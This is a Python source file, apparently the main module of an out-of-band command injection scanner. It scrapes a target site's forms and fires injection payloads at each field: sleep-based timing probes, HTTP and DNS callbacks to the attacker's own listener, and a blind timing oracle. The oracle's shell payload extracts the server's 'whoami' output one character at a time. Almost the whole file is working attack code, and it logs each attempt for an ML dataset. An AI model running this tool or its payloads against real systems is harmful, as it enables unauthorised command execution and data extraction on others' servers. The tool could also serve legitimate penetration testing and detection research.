import threading
import time
import requests
import sys
import json
import socket
import uuid
from datetime import datetime
from queue import Queue, Empty
from core.listener import start_listener, start_dns_listener
from core.scraper import extract_forms
from core.engine import generate_payloads
from core.logger import ScanLogger

GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
RESET  = "\033[0m"

DEFAULT_HTTP_PORT = 8000
DEFAULT_DNS_PORT  = 53
BINARY_CHARSET    = "abcdefghijklmnopqrstuvwxyz0123456789-_"


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def fire_request(method, action, field_name, payload, timeout):
    """
    Send a single injection request.
    Returns (duration, status_code, response_size, response_headers, response_text, timestamp)
    """
    data      = {field_name: f"test{payload}"}
    timestamp = datetime.utcnow().isoformat()
    start     = time.time()
    try:
        if method == "post":
            resp = requests.post(action, data=data, timeout=timeout)
        else:
            resp = requests.get(action, params=data, timeout=timeout)
        duration = time.time() - start
        return (
            duration,
            resp.status_code,
            len(resp.content),
            dict(resp.headers),
            resp.text[:2000],   # cap text to avoid huge dataset rows
            timestamp,
        )
    except requests.exceptions.ReadTimeout:
        return (timeout, None, 0, {}, "", timestamp)
    except Exception as e:
        print(f"  {RED}[!] Network Error: {e}{RESET}")
        return (None, None, 0, {}, "", timestamp)


def check_oob_queue(oob_queue, canary_map, wait=2.0):
    """Wait briefly for a callback. Returns (proto, path, matched_canary, timestamp) or None."""
    time.sleep(wait)
    ts = datetime.utcnow().isoformat()
    try:
        proto, hit_path = oob_queue.get(timeout=0.1)
        matched = None
        for cid, cdata in canary_map.items():
            if cid in hit_path:
                matched = cdata
                break
        return proto, hit_path, matched, ts
    except Empty:
        return None


def run_binary_oracle(action, method, field, baseline, scan_logger, param_count, field_type):
    """Extract whoami char-by-char using only sleep timing."""
    print(f"\n  {YELLOW}[*] Both HTTP and DNS blocked by firewall.{RESET}")
    print(f"  {YELLOW}[*] Activating binary timing oracle — no outbound connection needed.{RESET}")
    print(f"  [*] Extracting 'whoami' on field '{field}' via sleep...\n")

    result = ""
    attempt = 0
    for pos in range(1, 13):
        found_char = None
        for char in BINARY_CHARSET:
            payload  = f"; if [ $(whoami | cut -c{pos}) = '{char}' ]; then sleep 5; fi #"
            attempt += 1
            result_tuple = fire_request(method, action, field, payload, timeout=8)
            duration, status, size, headers, text, req_ts = result_tuple
            if duration is None:
                continue

            confirmed = duration >= (baseline + 4)

            scan_logger.log_attempt(
                url=action, method=method, field=field,
                field_type=field_type, param_count=param_count,
                payload=payload, payload_type="binary_oracle",
                canary_id="", attempt_number=attempt,
                status_code=status or 0, response_time=duration,
                response_size=size, response_headers=headers,
                response_text=text, callback_received=confirmed,
                callback_protocol="none", callback_path="",
                callback_timestamp="", request_timestamp=req_ts,
                vulnerable=1 if confirmed else 0,
            )

            if confirmed:
                result    += char
                found_char = char
                print(f"  [+] Position {pos}: '{char}'  →  so far: '{result}'")
                break
        if found_char is None:
            break
    return result if result else None


def probe_field(action, method, field, field_type, param_count,
                payloads, oob_queue, canary_map, baseline,
                findings, scan_logger):
    """
    Smart probe logic for a single field.

    Phase 1 — Time-based        (ALWAYS runs — independent detection)
    Phase 2 — HTTP probe        (ALWAYS runs)
        └── HTTP works → run all HTTP payloads → done
        └── HTTP fails + time confirmed → Phase 3
        └── Neither → not injectable

    Phase 3 — DNS fallback      (HTTP failed + time confirmed)
        └── DNS works → done
        └── DNS fails → Phase 4

    Phase 4 — Binary oracle     (HTTP + DNS both blocked)
    """
    print(f"\n[*] Auditing field: {GREEN}'{field}'{RESET} at {action}")

    time_confirmed = False
    http_works     = False
    dns_works      = False
    attempt        = 0

    time_payloads = [(p, t, d) for p, t, d in payloads if t == "time_based"]
    http_payloads = [(p, t, d) for p, t, d in payloads if t == "oob_http"]
    dns_payloads  = [(p, t, d) for p, t, d in payloads if t == "oob_dns"]

    # ── Phase 1: Time-based (always runs) ──────────────────────────────
    print(f"\n  {CYAN}[Phase 1] Time-based detection...{RESET}")
    for payload_tmpl, _, expected_delay in time_payloads:
        attempt   += 1
        canary_id  = uuid.uuid4().hex[:10]
        payload    = payload_tmpl.replace("{CANARY}", canary_id)
        print(f"  [>] Firing (time_based): {payload.strip()}")

        duration, status, size, headers, text, req_ts = fire_request(
            method, action, field, payload, timeout=expected_delay + 3
        )
        if duration is None:
            continue

        confirmed = duration >= (baseline + expected_delay - 1)

        scan_logger.log_attempt(
            url=action, method=method, field=field,
            field_type=field_type, param_count=param_count,
            payload=payload, payload_type="time_based",
            canary_id=canary_id, attempt_number=attempt,
            status_code=status or 0, response_time=duration,
            response_size=size, response_headers=headers,
            response_text=text, callback_received=False,
            callback_protocol="none", callback_path="",
            callback_timestamp="", request_timestamp=req_ts,
            vulnerable=1 if confirmed else 0,
        )

        if confirmed:
            time_confirmed = True
            findings.append({
                "type":    "TIME-BASED",
                "url":     action,
                "field":   field,
                "payload": payload.strip(),
                "delay":   round(duration, 2),
            })
            print(f"\n  {RED}[!!!] VULNERABILITY CONFIRMED: TIME-BASED [!!!]{RESET}")
            print(f"  [+] '{field}' responded in {duration:.2f}s (baseline: {baseline:.2f}s)\n")
            break

    if not time_confirmed:
        print(f"  {YELLOW}[-] No time-based delay on '{field}'.{RESET}")

    # ── Phase 2: HTTP probe (always runs) ──────────────────────────────
    print(f"\n  {CYAN}[Phase 2] Testing HTTP connectivity...{RESET}")
    probe_tmpl, _, _ = http_payloads[0]
    canary_id  = uuid.uuid4().hex[:10]
    probe      = probe_tmpl.replace("{CANARY}", canary_id)
    canary_map[canary_id] = {"url": action, "field": field, "payload": probe.strip()}
    attempt   += 1

    print(f"  [>] Probing: {probe.strip()}")
    duration, status, size, headers, text, req_ts = fire_request(
        method, action, field, probe, timeout=12
    )
    cb_result = check_oob_queue(oob_queue, canary_map)

    cb_received = cb_result is not None
    cb_proto    = cb_result[0] if cb_result else "none"
    cb_path     = cb_result[1] if cb_result else ""
    cb_ts       = cb_result[3] if cb_result else ""

    scan_logger.log_attempt(
        url=action, method=method, field=field,
        field_type=field_type, param_count=param_count,
        payload=probe, payload_type="oob_http",
        canary_id=canary_id, attempt_number=attempt,
        status_code=status or 0, response_time=duration or 0,
        response_size=size, response_headers=headers,
        response_text=text, callback_received=cb_received,
        callback_protocol=cb_proto, callback_path=cb_path,
        callback_timestamp=cb_ts, request_timestamp=req_ts,
        vulnerable=1 if cb_received else 0,
    )

    if cb_result:
        proto, hit_path, matched, cb_ts = cb_result
        http_works = True
        print(f"  {GREEN}[+] HTTP works — running all HTTP payloads.{RESET}")
        findings.append({
            "type": "OOB-CALLBACK (HTTP)", "url": action, "field": field,
            "payload": probe.strip(), "callback": hit_path, "canary": canary_id,
        })
        print(f"\n  {RED}[!!!] VULNERABILITY CONFIRMED: OOB HTTP [!!!]{RESET}")
        print(f"  [+] Callback: {hit_path}  Canary: {canary_id}\n")

        # Run remaining HTTP payloads
        for payload_tmpl, _, _ in http_payloads[1:]:
            attempt   += 1
            canary_id  = uuid.uuid4().hex[:10]
            payload    = payload_tmpl.replace("{CANARY}", canary_id)
            canary_map[canary_id] = {"url": action, "field": field, "payload": payload.strip()}
            print(f"  [>] Firing (oob_http): {payload.strip()}")

            duration, status, size, headers, text, req_ts = fire_request(
                method, action, field, payload, timeout=12
            )
            res = check_oob_queue(oob_queue, canary_map)

            cb_r = res is not None
            scan_logger.log_attempt(
                url=action, method=method, field=field,
                field_type=field_type, param_count=param_count,
                payload=payload, payload_type="oob_http",
                canary_id=canary_id, attempt_number=attempt,
                status_code=status or 0, response_time=duration or 0,
                response_size=size, response_headers=headers,
                response_text=text, callback_received=cb_r,
                callback_protocol=res[0] if res else "none",
                callback_path=res[1] if res else "",
                callback_timestamp=res[3] if res else "",
                request_timestamp=req_ts,
                vulnerable=1 if cb_r else 0,
            )

            if res:
                _, hit_path, _, _ = res
                findings.append({
                    "type": "OOB-CALLBACK (HTTP)", "url": action, "field": field,
                    "payload": payload.strip(), "callback": hit_path, "canary": canary_id,
                })
                print(f"  {RED}[!!!] OOB HTTP CALLBACK [!!!]{RESET}")
                print(f"  [+] Callback: {hit_path}  Canary: {canary_id}\n")

        return   # HTTP worked

    print(f"  {YELLOW}[-] No HTTP callback.{RESET}")

    if not time_confirmed:
        print(f"  {GREEN}[-] No injection detected on '{field}'.{RESET}")
        return

    # ── Phase 3: DNS fallback ───────────────────────────────────────────
    print(f"\n  {CYAN}[Phase 3] HTTP blocked. Trying DNS fallback...{RESET}")
    for payload_tmpl, _, _ in dns_payloads:
        attempt   += 1
        canary_id  = uuid.uuid4().hex[:10]
        payload    = payload_tmpl.replace("{CANARY}", canary_id)
        canary_map[canary_id] = {"url": action, "field": field, "payload": payload.strip()}
        print(f"  [>] Firing (oob_dns): {payload.strip()}")

        duration, status, size, headers, text, req_ts = fire_request(
            method, action, field, payload, timeout=12
        )
        res = check_oob_queue(oob_queue, canary_map)

        cb_r = res is not None
        scan_logger.log_attempt(
            url=action, method=method, field=field,
            field_type=field_type, param_count=param_count,
            payload=payload, payload_type="oob_dns",
            canary_id=canary_id, attempt_number=attempt,
            status_code=status or 0, response_time=duration or 0,
            response_size=size, response_headers=headers,
            response_text=text, callback_received=cb_r,
            callback_protocol=res[0] if res else "none",
            callback_path=res[1] if res else "",
            callback_timestamp=res[3] if res else "",
            request_timestamp=req_ts,
            vulnerable=1 if cb_r else 0,
        )

        if res:
            _, hit_path, _, _ = res
            dns_works = True
            findings.append({
                "type": "OOB-CALLBACK (DNS)", "url": action, "field": field,
                "payload": payload.strip(), "callback": hit_path, "canary": canary_id,
            })
            print(f"\n  {RED}[!!!] VULNERABILITY CONFIRMED: OOB DNS [!!!]{RESET}")
            print(f"  [+] Callback: {hit_path}  Canary: {canary_id}\n")

    if dns_works:
        return

    # ── Phase 4: Binary oracle ──────────────────────────────────────────
    extracted = run_binary_oracle(
        action, method, field, baseline,
        scan_logger, param_count, field_type
    )
    if extracted:
        findings.append({
            "type": "BINARY-ORACLE", "url": action, "field": field,
            "extracted": extracted,
            "note": "Extracted via sleep timing — no outbound connection needed",
        })
        print(f"\n  {RED}[!!!] BINARY ORACLE RESULT [!!!]{RESET}")
        print(f"  [+] Extracted whoami: '{extracted}'\n")


def run_orchestrator(target_url, lhost):
    print(f"\n[*] {CYAN}Initializing OOB Orchestrator...{RESET}")
    print(f"[*] LHOST: {lhost}")

    oob_queue  = Queue()
    canary_map = {}

    threading.Thread(target=start_listener,
                     args=(lhost, DEFAULT_HTTP_PORT, oob_queue), daemon=True).start()
    threading.Thread(target=start_dns_listener,
                     args=(lhost, DEFAULT_DNS_PORT, oob_queue), daemon=True).start()
    time.sleep(1)

    surfaces = extract_forms(target_url)
    if not surfaces:
        print(f"{RED}[-] No attack surface found on target.{RESET}")
        return

    payloads = generate_payloads(lhost, DEFAULT_HTTP_PORT)

    # Median baseline (3 samples)
    print(f"\n[*] {CYAN}Measuring baseline response time...{RESET}")
    try:
        baseline_resp = None
        samples = []
        for _ in range(3):
            r = requests.get(target_url, timeout=10)
            samples.append(r.elapsed.total_seconds())
            baseline_resp = r
        baseline = sorted(samples)[1]
        print(f"[*] Baseline (median of 3): {baseline:.2f}s")
    except Exception:
        baseline      = 0.0
        baseline_resp = None

    # Init logger
    scan_logger = ScanLogger(target_url, lhost, baseline)
    if baseline_resp:
        scan_logger.set_server_info(dict(baseline_resp.headers))

    findings = []

    for surface in surfaces:
        param_count = len(surface["inputs"])
        for inp in surface["inputs"]:
            probe_field(
                action      = surface["action"],
                method      = surface["method"],
                field       = inp["name"],
                field_type  = inp["type"],
                param_count = param_count,
                payloads    = payloads,
                oob_queue   = oob_queue,
                canary_map  = canary_map,
                baseline    = baseline,
                findings    = findings,
                scan_logger = scan_logger,
            )

    # Summary
    print(f"\n{'='*55}")
    if findings:
        print(f"{RED}[!!!] {len(findings)} FINDING(S) CONFIRMED{RESET}")
        for i, f in enumerate(findings, 1):
            print(f"\n  [{i}] Type    : {f['type']}")
            print(f"       URL     : {f['url']}")
            print(f"       Field   : {f['field']}")
            if "payload"   in f: print(f"       Payload : {f['payload']}")
            if "delay"     in f: print(f"       Delay   : {f['delay']}s")
            if "callback"  in f: print(f"       Callback: {f['callback']}")
            if "canary"    in f: print(f"       Canary  : {f['canary']}")
            if "extracted" in f: print(f"       Extracted: {f['extracted']}")
            if "note"      in f: print(f"       Note    : {f['note']}")
    else:
        print(f"{GREEN}[+] No vulnerabilities detected.{RESET}")

    # Save findings report
    with open("report.json", "w") as fh:
        json.dump({"target": target_url, "findings": findings}, fh, indent=2)
    print(f"\n[*] {GREEN}Findings report → report.json{RESET}")

    # Save ML dataset
    scan_logger.save("scan_results.json")

    print(f"[*] {GREEN}Orchestration complete.{RESET}")
    time.sleep(1)


if __name__ == "__main__":
    print(f"{CYAN}{'='*55}")
    print(f"      OOB Command Injection Scanner")
    print(f"{'='*55}{RESET}")
    print(f"{YELLOW}[!] For DNS listener run with: sudo python3 main.py{RESET}\n")

    try:
        target = input("[?] Enter Target URL (e.g. http://127.0.0.1:9000): ").strip()
        if not target:
            print(f"{RED}[!] No URL provided. Exiting.{RESET}")
            sys.exit(1)

        lhost = get_local_ip()
        run_orchestrator(target, lhost)

    except KeyboardInterrupt:
        print(f"\n{RED}[!] User interrupted. Exiting.{RESET}")